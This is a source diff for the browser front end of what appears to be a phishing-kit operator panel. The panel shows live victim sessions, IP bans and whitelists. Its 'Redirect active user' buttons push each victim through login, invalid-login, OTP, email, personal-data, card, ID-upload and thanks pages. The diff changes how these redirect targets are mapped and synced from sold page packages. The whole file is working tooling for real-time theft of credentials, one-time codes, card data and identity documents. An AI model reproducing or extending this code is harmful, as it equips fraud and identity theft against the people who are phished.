@@ -1208,17 +1208,43 @@ function sessionCurrentFlowLabel(session = null, latestResult = null, command = 
     || command?.note
     || "";
 }
+function runtimeFileFromTargetUrl(value = "") {
+  try {
+    const parsed = new URL(String(value || ""), "https://deuce.local");
+    return normalizedRuntimeScreenFile(parsed.searchParams.get("file") || "");
+  } catch {
+    return "";
+  }
+}
 
-function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "") {
+function sessionCurrentFlowFile(session = null, latestResult = null, command = null) {
+  const resultFile = Array.isArray(latestResult?.flow)
+    ? [...latestResult.flow]
+      .reverse()
+      .map((file) => normalizedRuntimeScreenFile(file))
+      .find(Boolean) || ""
+    : "";
+  return normalizedRuntimeScreenFile(
+    session?.screenFile
+    || resultFile
+    || command?.targetFile
+    || runtimeFileFromTargetUrl(command?.targetUrl)
+  );
+}
+
+function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "", currentFile = "") {
   const currentKey = normalizeFlowLabel(currentLabel);
+  const currentFileKey = normalizedRuntimeScreenFile(currentFile).toLowerCase();
   return `
     <div class="session-command result-live-command">
       <strong class="flow-command-title">One-click flow</strong>
       <div class="session-route-buttons" aria-label="Redirect active user">
         ${pageTargets.length ? pageTargets.map((target) => {
-          const isCurrent = currentKey && normalizeFlowLabel(target.label) === currentKey;
+          const isCurrent = currentFileKey
+            ? normalizedRuntimeScreenFile(target.file).toLowerCase() === currentFileKey
+            : Boolean(currentKey && normalizeFlowLabel(target.label) === currentKey);
           return `
-          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent && !target.forceReload ? "disabled" : ""}>
+          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-file="${escapeHtml(target.file)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent && !target.forceReload ? "disabled" : ""}>
             ${escapeHtml(target.label)}
           </button>
         `;
@@ -1243,7 +1269,7 @@ function activeSessionCardMarkup(session, page, pageTargets = [], command = null
         <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
         <span>${escapeHtml(commandStatusLabel(command))}</span>
       </div>
-      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
+      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command), sessionCurrentFlowFile(session, null, command))}
     </article>
   `;
 }
@@ -1312,6 +1338,7 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
   const pageTargets = options.pageTargets || [];
   const latestResult = session.results[session.results.length - 1] || null;
   const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
+  const currentFlowFile = sessionCurrentFlowFile(activeSession, latestResult, command);
   const isBlocked = ipStatus === "Banned" || String(activeSession?.result || "").toLowerCase() === "blocked";
   const commandStatus = command?.status || (command?.targetUrl ? "queued" : "none");
   const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "offline";
@@ -1347,7 +1374,7 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
           <span>${escapeHtml(ipStatus)}</span>
           <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
         </div>
-        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel)}
+        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel, currentFlowFile)}
       </summary>
       <div class="session-result-timeline">
         ${sessionResultDetailMarkup(session, page)}
@@ -1365,7 +1392,9 @@ async function loadResultsControlData(page, options = {}) {
     const results = (resultsData.results || []).map(normalizePageResult);
     page.results = results;
     page.activeSessions = sessionsData.sessions || [];
-    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions } : item);
+    page.runtimeTargets = sessionsData.targets || [];
+    page.screenSync = sessionsData.screenSync || {};
+    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions, runtimeTargets: page.runtimeTargets, screenSync: page.screenSync } : item);
   } catch (error) {
     statusText.textContent = `RESULTS LOAD WARNING: ${error.message}`.toUpperCase();
   }
@@ -1675,6 +1704,8 @@ function goLiveChecklistMarkup(items = []) {
 }
 
 function packageForUserPage(page) {
+  const snapshot = page?.configs?.runtimePackageSnapshot;
+  if (snapshot?.packageManifest?.screens?.length) return snapshot;
   const packages = [...marketPages, ...adminPackages];
   return packages.find((pagePackage) => (
     pagePackage.id === page.packageId
@@ -1712,13 +1743,6 @@ function sessionTargetFile(screen, manifestScreens = []) {
     return matched?.file || (/\.html?$/i.test(flowName) ? flowName : "");
   }
   return String(screen?.file || screen?.path || screen?.href || "").trim();
-}
-
-function runtimeScreenTargetUrl(page, file) {
-  const cleanFile = String(file || "").replace(/^\/+/, "").trim();
-  if (!page?.id || !cleanFile) return "";
-  const params = new URLSearchParams({ userPageId: page.id, file: cleanFile });
-  return `/api/runtime/source?${params.toString()}`;
 }
 
 function refreshImportedScreenOrder() {
@@ -1844,67 +1868,45 @@ function downloadBlob(fileName, content, type) {
   window.setTimeout(() => URL.revokeObjectURL(url), 1000);
 }
 
-function canonicalRuntimeFlowTargets(page, discoveredFiles = []) {
-  const byFile = new Map(discoveredFiles.map((file) => [String(file || "").toLowerCase(), file]));
-  const hasFile = (file) => byFile.has(file.toLowerCase());
-  const makeTarget = (label, file, options = {}) => ({
-    label,
-    file,
-    url: runtimeScreenTargetUrl(page, file),
-    ...options
-  });
-
-  const targets = [];
-  [
-    ["Login", "index.html"],
-    ["Invalid Login", "login2.html"],
-    ["OTP", "otp.html"],
-    ["Email", "email.html"],
-    ["Personal", "personal.html"],
-    ["Card", "c.html"],
-    ["Thanks", "thnks.html"]
-  ].forEach(([label, file]) => {
-    if (hasFile(file)) targets.push(makeTarget(label, byFile.get(file.toLowerCase())));
-  });
-
-  if (hasFile("otp2.html")) {
-    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp2.html")));
-  } else if (hasFile("otp.html")) {
-    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp.html"), {
-      forceReload: true,
-      fallbackFor: "otp2.html"
-    }));
-  }
-
-  const uploadFile = discoveredFiles.find((file) => /(^|\/)(upload|upload-?id|photo|photo-?id|id-?photo|id|id-upload|id_upload|document|docs?)\.html?$/i.test(file));
-  if (uploadFile && !targets.some((target) => target.file.toLowerCase() === uploadFile.toLowerCase())) {
-    const insertBeforeThanks = targets.findIndex((target) => target.file.toLowerCase() === "thnks.html");
-    const uploadTarget = makeTarget("Upload ID", uploadFile);
-    if (insertBeforeThanks === -1) targets.push(uploadTarget);
-    else targets.splice(insertBeforeThanks, 0, uploadTarget);
-  }
-
-  return targets.filter((target) => target.url);
+function normalizedRuntimeScreenFile(value = "") {
+  const file = String(value || "").replace(/\\/g, "/").replace(/^\/+/, "").trim();
+  if (!file || file.length > 240 || file.split("/").some((part) => part === "..")) return "";
+  return /\.html?$/i.test(file) ? file : "";
 }
 
 function sessionPageTargets(page) {
   const pagePackage = packageForUserPage(page);
   const manifestScreens = pagePackage?.packageManifest?.screens || [];
-  const candidates = [
-    ...(page.flow || []),
-    ...manifestScreens,
-    ...(pagePackage?.screens || [])
-  ];
+  const serverTargets = Array.isArray(page?.runtimeTargets) ? page.runtimeTargets : [];
+  const snapshotScreens = (page?.flow || []).filter((screen) => (
+    typeof screen === "object" && normalizedRuntimeScreenFile(screen?.file || screen?.path || screen?.href)
+  ));
+  const candidates = serverTargets.length
+    ? serverTargets
+    : snapshotScreens.length
+      ? snapshotScreens
+      : manifestScreens.length
+        ? manifestScreens
+        : pagePackage?.screens || [];
+  const availableFiles = new Set((pagePackage?.packageManifest?.files || [])
+    .map((item) => normalizedRuntimeScreenFile(item?.path || item?.file || item))
+    .filter(Boolean)
+    .map((file) => file.toLowerCase()));
   const seen = new Set();
-  const discoveredFiles = candidates.reduce((files, screen) => {
-    const file = sessionTargetFile(screen, manifestScreens).replace(/^\/+/, "");
-    if (!file || !/\.html?$/i.test(file) || seen.has(file.toLowerCase())) return files;
-    seen.add(file.toLowerCase());
-    files.push(file);
-    return files;
+  return candidates.reduce((targets, screen) => {
+    const file = normalizedRuntimeScreenFile(sessionTargetFile(screen, manifestScreens));
+    const key = file.toLowerCase();
+    if (!file || seen.has(key) || (availableFiles.size && !availableFiles.has(key))) return targets;
+    seen.add(key);
+    targets.push({
+      id: screen?.id || key,
+      file,
+      label: sessionTargetLabel(screen, file),
+      role: screen?.role || (targets.length === 0 ? "entry" : "screen"),
+      order: targets.length
+    });
+    return targets;
   }, []);
-
-  return canonicalRuntimeFlowTargets(page, discoveredFiles);
 }
 
 function shouldUsePackageRuntime(page, pagePackage) {
@@ -5134,8 +5136,9 @@ async function renderResultsCenter(pageSlug = "page-a", options = {}) {
             <h3>Compact sessions</h3>
           </div>
           <div class="compact-center-actions">
-            <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s</span>
+            <span class="live-refresh-indicator" aria-live="polite">Auto-refresh 5s / ${pageTargets.length} mapped page${pageTargets.length === 1 ? "" : "s"}</span>
             <button type="button" data-refresh-results="${routeKey}">Refresh</button>
+            <button type="button" data-sync-result-screens="${routeKey}" title="Replace this subscription snapshot with the package's current saved screen order">${page.screenSync?.stale ? "Sync updated pages" : "Sync package pages"}</button>
             <button type="button" data-route="#security-${routeKey}:traffic">Open traffic</button>
           </div>
         </div>
@@ -7002,6 +7005,32 @@ preview.addEventListener("click", async (event) => {
     return;
   }
 
+  const syncResultScreensButton = event.target.closest("[data-sync-result-screens]");
+  if (syncResultScreensButton) {
+    const resultPage = getPageBySlug(syncResultScreensButton.dataset.syncResultScreens);
+    if (!resultPage) {
+      statusText.textContent = "PAGE RECORD NOT FOUND";
+      return;
+    }
+    try {
+      await withButtonBusy(syncResultScreensButton, "Syncing", async () => {
+        const result = await requestApi(`/api/user-pages/${resultPage.id}/screens/sync`, { method: "POST" });
+        const updated = normalizeUserPage({
+          ...result.userPage,
+          results: resultPage.results || [],
+          activeSessions: resultPage.activeSessions || [],
+          runtimeTargets: result.targets || []
+        });
+        ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
+        await renderResultsCenter(pageRouteKey(updated));
+      });
+      statusText.textContent = "PACKAGE SCREEN ORDER SYNCED";
+    } catch (error) {
+      statusText.textContent = `SCREEN SYNC FAILED: ${error.message}`.toUpperCase();
+    }
+    return;
+  }
+
   const downloadButton = event.target.closest("[data-download-index]");
   if (downloadButton) {
     try {
@@ -7136,19 +7165,16 @@ preview.addEventListener("click", async (event) => {
     event.preventDefault();
     const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
     const sessionId = sessionRedirectButton.dataset.sessionRedirect;
-    const targetField = [...preview.querySelectorAll("[data-session-target]")]
-      .find((field) => field.dataset.sessionTarget === sessionId);
-    const targetUrl = sessionRedirectButton.dataset.sessionTargetUrl || targetField?.value.trim() || "";
-    const targetLabel = sessionRedirectButton.dataset.sessionTargetLabel || targetUrl;
+    const targetFile = normalizedRuntimeScreenFile(sessionRedirectButton.dataset.sessionTargetFile);
     const forceReload = sessionRedirectButton.dataset.sessionForceReload === "true";
-    if (!resultPage || !targetUrl) {
-      statusText.textContent = "REDIRECT TARGET REQUIRED";
+    if (!resultPage || !targetFile) {
+      statusText.textContent = "MAPPED PACKAGE PAGE REQUIRED";
       return;
     }
     await withButtonBusy(sessionRedirectButton, "Redirecting", async () => {
       const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
         method: "POST",
-        body: JSON.stringify({ targetUrl, note: targetLabel, forceReload })
+        body: JSON.stringify({ targetFile, forceReload })
       });
       const updated = normalizeUserPage(result.userPage);
       ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
